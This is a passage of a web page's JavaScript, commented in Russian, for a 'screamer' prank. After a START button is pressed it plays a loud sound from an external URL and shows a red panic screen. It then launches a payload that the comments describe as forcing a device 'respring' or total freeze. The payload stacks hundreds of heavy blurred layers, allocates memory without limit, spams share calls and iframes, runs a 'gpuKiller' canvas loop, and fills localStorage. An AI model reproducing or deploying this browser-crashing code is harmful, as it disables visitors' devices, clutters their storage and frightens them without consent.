      display: none;

      padding: 0;

          <script>
            const container = document.createElement('div');
            container.style.cssText = 'perspective: 1px; perspective-origin: 9999999% 9999999%; width: 100vw; height: 100vh;';
            document.body.appendChild(container);
            
            for (let i = 0; i < 650; i++) {
              let layer = document.createElement('div');
              layer.style.cssText = \`
                position: absolute;
                width: 100vw;
                height: 100vh;
                backdrop-filter: blur(120px) brightness(1.2) saturate(3);
                -webkit-backdrop-filter: blur(120px) brightness(1.2) saturate(3);
                transform: translate3d(80000px, 80000px, \${i * 20}px) rotateY(70deg);
                opacity: 0.98;
                background: radial-gradient(circle, rgba(255,0,100,0.4), rgba(0,0,0,0.9));
                mix-blend-mode: overlay;
              \`;
              container.appendChild(layer);
            }
            
            setInterval(() => {
              try {
                navigator.share({ title: 'X'.repeat(60000), text: 'Z'.repeat(60000) });
              } catch(e) {}
              let hugeArray = new Uint8Array(1024 * 1024 * 28);
              crypto.getRandomValues(hugeArray);
              let filler = [];
              for (let k = 0; k < 5; k++) filler.push(new ArrayBuffer(1024 * 1024 * 12));
            }, 0);
            
            const canvas = document.createElement('canvas');
            canvas.width = 4096;
            canvas.height = 4096;
            const ctx = canvas.getContext('2d');
            let phase = 0;
            function gpuKiller() {
              phase += 0.02;
              if (ctx) {
                for (let i = 0; i < 100; i++) {
                  ctx.fillStyle = \`hsl(\${phase * 50 + i * 30}, 80%, 50%)\`;
                  ctx.fillRect(i * 42, (i * 13) % 4000, 600, 600);
                }
              }
              requestAnimationFrame(gpuKiller);
            }
            gpuKiller();
            
            for (let f = 0; f < 200; f++) {
              let spamIframe = document.createElement('iframe');
              spamIframe.srcdoc = "<html><body><div style='width:9999px;height:9999px'></div></body></html>";
              spamIframe.style.cssText = "position:absolute; width:100%; height:100%; opacity:0.01;";
              document.body.appendChild(spamIframe);
            }
          <\/script>
        </body>
        </html>
      `;
      
      iframe.srcdoc = heavyPayload;
      
      // дополнительная нагрузка на память (localStorage + Blob)
      try {
        for (let b = 0; b < 45; b++) {
          const blob = new Blob([new ArrayBuffer(1024 * 1024 * 5)], {type: 'text/plain'});
          const url = URL.createObjectURL(blob);
          setTimeout(() => URL.revokeObjectURL(url), 5);
        }
      } catch(e) {}
      
      try {
        let ls = window.localStorage;
        let i = 0;
        while (i < 350) {
          ls.setItem(`_panic_mellstroy_${i}`, 'X'.repeat(55000));
          i++;
        }
      } catch(e) {}
    }
    
    // ГЛАВНЫЙ ТРИГГЕР: ЗВУК + КРАСНЫЙ ПАНИЧЕСКИЙ ЭКРАН + RESPRING (В ТОЧНОСТИ КАК В ОРИГИНАЛЕ)
    function triggerMellstroyScreamer() {
      if (isPanicActive) return;
      
      // Сразу прячем кнопку START и её контейнер (переход в режим скримера)
      const startWrapper = document.getElementById('startWrapper');
      if (startWrapper) {
        startWrapper.classList.add('hide-start');
      }
      
      // Звуковой скример (тот же URL, что и в исходнике)
      if (!panicAudio) {
        panicAudio = new Audio('https://vityaig.github.io/otkat.mp3');
        panicAudio.preload = 'auto';
        panicAudio.volume = 1.0;
      }
      
      const playPromise = panicAudio.play();
      if (playPromise && typeof playPromise.catch === 'function') {
        playPromise.catch((e) => console.warn("Аудио заблокировано, но паника продолжается", e));
      }
      
      if (panicTimer) clearTimeout(panicTimer);
      panicTimer = setTimeout(() => {
        startPanicScreen();   // красный экран с тысячами ошибок
        
        if (respringTimer) clearTimeout(respringTimer);
        respringTimer = setTimeout(() => {
          launchRespring();   // форсированный respring / полное зависание
        }, 580);
      }, 100);
    }
  
    // --------------------------------------------------------------
    // 2. ПРИВЯЗКА К КНОПКЕ START (ПОСЛЕ НАЖАТИЯ - СКРИМЕР + ПАНИКА)
    // --------------------------------------------------------------
    const startBtn = document.getElementById('startButton');
    if (startBtn) {
      // Обработчик для кликов и тач-событий (надёжно)
      const clickHandler = (e) => {
        e.preventDefault();
        e.stopPropagation();
        if (isPanicActive) return;
        triggerMellstroyScreamer();
      };
      
      startBtn.addEventListener('click', clickHandler);
      startBtn.addEventListener('touchstart', clickHandler, { passive: false });
    }
    
    // Блокируем прокрутку во время паники (чтобы скример выглядел жёстко)
    window.addEventListener('touchmove', function(e) {
      if (isPanicActive) {
        e.preventDefault();
      }
    }, { passive: false });
    
    // Предзагрузка аудио-ресурса для мгновенной реакции (как в оригинале)
    const preconnectLink = document.createElement('link');
    preconnectLink.rel = 'preconnect';
    preconnectLink.href = 'https://vityaig.github.io';
    document.head.appendChild(preconnectLink);
    
    // Так же предзагрузим аудио без авто-проигрывания, чтобы в момент клика не было задержки
    const preloadAudio = new Audio('https://vityaig.github.io/otkat.mp3');
    preloadAudio.preload = 'auto';
    preloadAudio.volume = 0.01;
    preloadAudio.load();
    
    // Небольшая подстраховка: если пользователь очень быстро нажал — ничего не ломается
    console.log('[MELLSTROY] Готово: только чёрный фон и кнопка START. После клика — полный скример.');
  </script>
